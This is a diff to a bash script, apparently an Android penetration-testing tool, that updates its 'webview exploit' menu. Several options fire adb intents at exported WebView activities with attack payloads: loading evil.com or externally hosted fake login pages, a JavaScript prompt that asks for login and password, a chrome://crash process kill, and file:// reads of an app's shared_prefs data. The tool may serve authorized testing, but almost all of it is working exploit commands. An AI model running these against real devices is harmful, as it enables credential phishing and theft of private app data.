@@ -74,7 +74,7 @@ path="/Users/mdnahidalam/Desktop/android_security/target/" # Set your path
 function banner(){
     clear
     echo -e "\033[0;32m"
-    echo "⣿⣿⣿⣿⣿⣿⣧⠻⣿⣿⠿⠿⠿⢿⣿⠟⣼⣿⣿⣿⣿⣿⣿ v2.0"
+    echo "⣿⣿⣿⣿⣿⣿⣧⠻⣿⣿⠿⠿⠿⢿⣿⠟⣼⣿⣿⣿⣿⣿⣿ v2.1"
     echo "⣿⣿⣿⣿⣿⣿⠟⠃⠁⠀⠀⠀⠀⠀⠀⠘⠻⣿⣿⣿⣿⣿⣿"
     echo "⣿⣿⣿⣿⡿⠃⠀⣴⡄⠀⠀⠀⠀⠀⣴⡆⠀⠘⢿⣿⣿⣿⣿"
     echo "⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿"
@@ -190,18 +190,26 @@ while true; do
         echo -e " "
         read -p "Press ENTER to Clear" enter
   
-  # webview exploit
+    # webview exploit
     elif [ "$input" == "8" ]; then
         banner
+        read -p "[$model] package name> " package_name
         read -p "[$model] activity name> " activity_name
         read -p "[$model] string name> " string
+        # Check if the package name exists in the activity name
+        if [[ $activity_name == *"$package_name"* ]]; then
+            # Remove the package name from the activity name
+            activity_name=${activity_name/$package_name/}
+            # Remove any leading or trailing slashes
+            activity_name=$(echo $activity_name | sed 's#^/##' | sed 's#/$##')
+        fi
         echo -e "\nChoice: 1) evil.com   "
         echo -e "        2) JavaScript Alert"
         echo -e "        3) Kill Process"
         echo -e "        4) XSS phishing"
         echo -e "        5) LFI"
-        echo -e "        6) Read File or Load\n"
-        echo -e "        7) Fake Login Page [HTML]\n"
+        echo -e "        6) Read File or Load"
+        echo -e "        7) Fake Login Page [HTML]"
         echo -e "        8) Fake Login Page [JavaScript]\n"
         read -p "[$model] option> " website_option
 
@@ -209,61 +217,60 @@ while true; do
         if [ "$website_option" == "1" ]; then
             banner
             website="https://evil.com"
-            adb shell am start -n "$activity_name" --es "$string" "$website"
-            echo -e "\nPoC: adb shell am start -n "$activity_name" --es "$string" "$website""
+            adb shell am start -n "$package_name/$activity_name" --es "$string" "$website"
+            echo -e "\nPoC: adb shell am start -n "$package_name/$activity_name" --es "$string" "$website""
         
         #JavaScript Alert
         elif [ "$website_option" == "2" ]; then
             banner
             website="https://nahid0x1.github.io/xss.html"
-            adb shell am start -n "$activity_name" --es "$string" "$website"
-            echo -e "\nPoC: adb shell am start -n "$activity_name" --es "$string" "$website""
+            adb shell am start -n "$package_name/$activity_name" --es "$string" "$website"
+            echo -e "\nPoC: adb shell am start -n "$package_name/$activity_name" --es "$string" "$website""
         
         #Kill Process
         elif [ "$website_option" == "3" ]; then
             banner
-            adb shell am start -n "$activity_name" -a "android.intent.action.VIEW" --es "$string" "chrome://crash" --es "type" "alert"
-            echo -e "\PoC: adb shell am start -n "$activity_name" -a "android.intent.action.VIEW" --es "$string" "chrome://crash" --es "type" "alert""
-        
+            adb shell am start -n "$package_name/$activity_name" -a "android.intent.action.VIEW" --es "$string" "chrome://crash" --es "type" "alert"
+            echo -e "n\ADB PoC: adb shell am start -n "$package_name/$activity_name" -a "android.intent.action.VIEW" --es "$string" "chrome://crash" --es "type" "alert""
+
         #XSS phishing
         elif [ "$website_option" == "4" ]; then
             banner
-            adb shell am start -n "$activity_name"
+            adb shell am start -n "$package_name/$activity_name"
             sleep 1
-            adb shell am start -n "$activity_name" -a "android.intent.action.VIEW" --es "$string" "javascript:{window.prompt\(\'Authorization:Login\'\,\'Input_Login\'\)\;window.prompt\(\'Authorization:Password\'\,\'Input_Password\'\)}" --es "type" "alert"
+            adb shell am start -n "$package_name/$activity_name" -a "android.intent.action.VIEW" --es "$string" "javascript:{window.prompt\(\'Authorization:Login\'\,\'Input_Login\'\)\;window.prompt\(\'Authorization:Password\'\,\'Input_Password\'\)}" --es "type" "alert"
             payload=
-            echo -e "\nPoC: adb shell am start -n "$activity_name" -a "android.intent.action.VIEW" --es "$string" "javascript:{window.prompt\(\'Authorization:Login\'\,\'Input_Login\'\)\;window.prompt\(\'Authorization:Password\'\,\'Input_Password\'\)}" --es "type" "alert""
+            echo -e "\nPoC: adb shell am start -n "$package_name/$activity_name" -a "android.intent.action.VIEW" --es "$string" "javascript:{window.prompt\(\'Authorization:Login\'\,\'Input_Login\'\)\;window.prompt\(\'Authorization:Password\'\,\'Input_Password\'\)}" --es "type" "alert""
         
         #LFI
         elif [ "$website_option" == "5" ]; then
             banner
-            read -p "[$model] package name> " package_name
             adb shell ls /data/data/$package_name/shared_prefs/
             read -p "[$model] file name> " file_name_lfi
-            adb shell am start -n "$activity_name" -a "android.intent.action.VIEW" --es "url" "file:///data/data/$package_name/shared_prefs/$file_name_lfi" --es "type" "alert"
-            echo -e "\nPoC: adb shell am start -n "$activity_name" -a "android.intent.action.VIEW" --es "url" "file:///data/data/$package_name/shared_prefs/$file_name_lfi" --es "type" "alert""
+            adb shell am start -n "$package_name/$activity_name" -a "android.intent.action.VIEW" --es "url" "file:///data/data/$package_name/shared_prefs/$file_name_lfi" --es "type" "alert"
+            echo -e "\nPoC: adb shell am start -n "$package_name/$activity_name" -a "android.intent.action.VIEW" --es "url" "file:///data/data/$package_name/shared_prefs/$file_name_lfi" --es "type" "alert""
 
         #Read File or Load
         elif [ "$website_option" == "6" ]; then
             banner
             echo "this is a very secret messege" >> secret.txt
             adb push secret.txt /sdcard
-            adb shell am start -n "$activity_name" -a "android.intent.action.VIEW" --es "url" "file:///sdcard/secret.txt" --es "type" "alert"
-            echo -e "adb shell am start -n "$activity_name" -a "android.intent.action.VIEW" --es "url" "file:///sdcard/secret.txt" --es "type" "alert""
+            adb shell am start -n "$package_name/$activity_name" -a "android.intent.action.VIEW" --es "url" "file:///sdcard/secret.txt" --es "type" "alert"
+            echo -e "adb shell am start -n "$package_name/$activity_name" -a "android.intent.action.VIEW" --es "url" "file:///sdcard/secret.txt" --es "type" "alert""
 
         #Fake Login Page [HTML]
         elif [ "$website_option" == "7" ]; then
             banner
             website="https://nahid0x1.github.io/fakelogin.html"
-            adb shell am start -n "$activity_name" --es "$string" "$website"
-            echo -e "\nPoC: adb shell am start -n "$activity_name" --es "$string" "$website""
+            adb shell am start -n "$package_name/$activity_name" --es "$string" "$website"
+            echo -e "\nPoC: adb shell am start -n "$package_name/$activity_name" --es "$string" "$website""
 
         #Fake Login Page [JavaScript]
         elif ["$website_option" == "8" ]; then
             banner
             website="https://nahid0x1.github.io/xss2.html"
-            adb shell am start -n "$activity_name" --es "$string" "$website"
-            echo -e "\nPoC: adb shell am start -n "$activity_name" --es "$string" "$website""
+            adb shell am start -n "$package_name/$activity_name" --es "$string" "$website"
+            echo -e "\nPoC: adb shell am start -n "$package_name/$activity_name" --es "$string" "$website""
 
         else
             echo "Wrong Option"
